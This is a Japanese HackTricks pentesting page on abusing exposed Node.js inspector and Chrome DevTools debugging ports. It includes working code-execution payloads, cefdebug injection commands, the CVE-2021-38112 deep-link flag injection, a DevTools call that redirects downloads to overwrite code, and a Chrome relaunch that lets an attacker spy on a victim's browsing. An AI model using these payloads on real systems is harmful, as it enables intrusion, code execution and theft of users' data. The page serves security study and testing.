# Node inspector/CEFデバッグの乱用

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 基本情報

`--inspect`スイッチで起動すると、Node.jsプロセスはデバッグクライアントを待機します。**デフォルトでは**、ホストとポート**`127.0.0.1:9229`**で待機します。各プロセスには**一意のUUID**も割り当てられます。

Inspectorクライアントは、接続するためにホストアドレス、ポート、およびUUIDを知って指定する必要があります。完全なURLは、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`のようになります。

{% hint style="warning" %}
**デバッガはNode.jsの実行環境に完全なアクセス権を持っているため**、このポートに接続できる悪意のあるアクターは、Node.jsプロセスの代わりに任意のコードを実行する可能性があります（**潜在的な特権エスカレーション**）。
{% endhint %}

Inspectorを起動する方法はいくつかあります：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
監査されたプロセスを開始すると、次のようなものが表示されます：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
CEF（Chromium Embedded Framework）をベースとしたプロセスは、デバッガーを開くために`--remote-debugging-port=9222`というパラメータを使用する必要があります（SSRF保護は非常に似ています）。ただし、これは**NodeJS**のデバッグセッションを許可する代わりに、ブラウザとの通信に[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。

デバッグされたブラウザを起動すると、次のようなものが表示されます：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ブラウザ、WebSockets、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketとHTTPリクエストを行うことができます。**一意のデバッガーセッションIDを取得するために、最初のHTTP接続が必要**です。**同一生成元ポリシー**により、ウェブサイトは**このHTTP接続を行うことができません**。[**DNSリバインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)****に対する追加のセキュリティ対策として、Node.jsは接続のための**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを検証します。

{% hint style="info" %}
この**セキュリティ対策により、インスペクターを悪用して単にHTTPリクエストを送信する**ことによるコードの実行が防止されます（これはSSRF脆弱性を悪用して行うことができます）。
{% endhint %}

### 実行中のプロセスでインスペクターを起動する

実行中のNode.jsプロセスに**シグナルSIGUSR1**を送信すると、デフォルトのポートで**インスペクターを起動**することができます。ただし、注意点として、十分な特権が必要なため、これにより**プロセス内の情報への特権アクセス**が付与されますが、直接的な特権昇格は行われません。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
これはコンテナ内で有用です。`--inspect`を使用してプロセスをシャットダウンして新しいプロセスを開始することはできません。なぜなら、プロセスとともにコンテナが終了してしまうからです。
{% endhint %}

### インスペクタ/デバッガへの接続

もし、**Chromiumベースのブラウザ**にアクセスできる場合、`chrome://inspect`または`edge://inspect`にアクセスして接続することができます。Configureボタンをクリックし、**ターゲットのホストとポート**がリストされていることを確認してください（次のイメージに、次のセクションの例を使用してRCEを取得する方法の例があります）。

![](<../../.gitbook/assets/image (620) (1).png>)

**コマンドライン**を使用して、デバッガ/インスペクタに接続することもできます。
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
このツール[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)は、ローカルで実行中の**インスペクタ**を見つけ、それらに**コードを注入**することができます。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
注意してください、**NodeJS RCE exploitsは**[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を介してブラウザに接続されている場合は機能しません（興味深いことをするためにAPIをチェックする必要があります）。
{% endhint %}

## NodeJSデバッガー/インスペクターでのRCE

{% hint style="info" %}
もし[**ElectronのXSSからRCEを取得する方法**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)を探してここに来た場合は、このページをチェックしてください。
{% endhint %}

Node **inspector**に**接続**できる場合、**RCE**を取得する一般的な方法は、次のようなものです（Chrome DevTools Protocolへの接続では機能しないようです）：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

APIはこちらで確認できます：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
このセクションでは、このプロトコルを悪用するために人々が使用した興味深い事例をリストアップします。

### ディープリンクを介したパラメーターのインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)では、Rhino SecurityがCEFベースのアプリケーションがシステムにカスタムURI（workspaces://）を登録し、そのURIを受け取り、そのURIから一部構築された設定でCEFベースのアプリケーションを起動していることを発見しました。

URIのパラメーターがURLデコードされ、CEFベースのアプリケーションの起動に使用されることが判明しました。これにより、ユーザーはコマンドラインにフラグ**`--gpu-launcher`**を**インジェクト**し、任意の操作を実行することができます。

したがって、以下のようなペイロードを使用することができます：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
実行するとcalc.exeが実行されます。

### ファイルの上書き

**ダウンロードされたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**で**頻繁に使用されるアプリケーションのソースコード**を上書きするためにファイルをダウンロードします。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCEと情報の外部流出

この記事[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)によると、theriverからRCEを取得し、内部ページを外部に流出させることが可能です。

### ポストエクスプロイテーション

実際の環境で、ユーザーのPCを侵害した後、Chrome/Chromiumベースのブラウザを使用してChromeプロセスを起動し、デバッグを有効化し、デバッグポートをポートフォワードすることができます。これにより、被害者がChromeで行うすべての操作を検査し、機密情報を盗むことができます。

ステルスの方法は、すべてのChromeプロセスを終了し、次のような呼び出しを行うことです。
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考文献

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
